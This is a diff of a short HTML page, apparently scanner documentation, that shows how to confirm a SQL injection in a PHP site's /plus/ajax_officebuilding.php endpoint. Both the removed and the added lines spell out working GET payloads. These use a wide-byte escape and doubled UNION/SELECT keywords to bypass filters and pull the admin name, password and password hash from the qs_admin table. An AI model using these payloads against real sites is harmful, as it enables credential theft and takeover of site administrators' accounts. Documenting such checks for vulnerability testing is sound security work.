@@ -1,14 +1,9 @@
 <meta charset="UTF-8">
 <div>
-    <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/plus/ajax_officebuilding.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=key&key=asd%\\u9326%27%20uniounionn%20selselectect%201,2,3,admin_name,5,6,7,pwd,9%20from%20qs_admin%20LIMIT%201%23</code>
-        <code>?act=key&key=asd%\\u9326%27%20uniounionn%20selselectect%201,2,3,pwd_hash,5,6,7,8,9%20from%20qs_admin%20LIMIT%201%23</code>
     <h3>验证过程</h3>
-    <p>构造第一个GET请求</p>
-    <p>查找response text 是否含有 "username" 和 "password" 字符；如果再构造第二个GET请求</p>
-    <p>查找第二个请求的response text 是否含有 "pwdhash" 字符</p>
+    <p>先访问</p>
+    <code>http://example.com/plus/ajax_officebuilding.php?act=key&key=asd%\\u9326%27%20uniounionn%20selselectect%201,2,3,admin_name,5,6,7,pwd,9%20from%20qs_admin%20LIMIT%201%23</code>
+    <p>查看返回页面源码中是否有 用户名与密码；如果有就再访问</p>
+    <code>http://example.com/plus/ajax_officebuilding.php?act=key&key=asd%\\u9326%27%20uniounionn%20selselectect%201,2,3,pwd_hash,5,6,7,8,9%20from%20qs_admin%20LIMIT%201%23</code>
+    <p>查看返回页面源码中是否有 密码的哈希值</p>
 </div>
